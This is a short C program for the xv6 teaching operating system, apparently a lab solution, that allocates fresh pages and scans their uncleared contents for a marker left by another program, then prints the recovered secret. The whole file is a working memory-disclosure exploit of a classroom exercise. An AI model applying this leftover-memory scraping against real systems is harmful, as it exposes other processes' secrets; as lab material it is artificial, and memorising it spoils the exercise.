#include "kernel/types.h"
#include "kernel/fcntl.h"
#include "user/user.h"
#include "kernel/riscv.h"

int
main(int argc, char *argv[])
{
  // secret's eager sbrk pages are freed onto kalloc's LIFO free list.
  // Grow eagerly too, reclaiming pages without clearing their old bytes.
  // Scan a bounded group of pages since exec/page-table allocations also
  // consume pages, so the virtual page index is not a stable identifier.
  enum { NPAGES = 32 };
  char *mem = sbrk(NPAGES * PGSIZE);
  char *marker = "Here it is: ";
  int mlen = strlen(marker);

  if (mem == SBRK_ERROR)
    exit(1);

  for (int page = 0; page < NPAGES; page++) {
    // secret places its marker at 32 + the first unsigned secret byte.
    for (int off = 32; off < 32 + 256; off++) {
      char *p = mem + page * PGSIZE + off;
      if (memcmp(p, marker, mlen) != 0)
        continue;
      char *secret = p + mlen;
      int n = 0;
      int limit = PGSIZE - off - mlen;
      while (n < limit && ((secret[n] >= '0' && secret[n] <= '9') ||
                           (secret[n] >= 'A' && secret[n] <= 'Z') ||
                           (secret[n] >= 'a' && secret[n] <= 'z')))
        n++;
      if (n > 0 && n < limit && secret[n] == 0 &&
          off == 32 + (uchar)secret[0]) {
        write(1, secret, n);
        write(1, "\n", 1);
        exit(0);
      }
    }
  }
  exit(1);
}
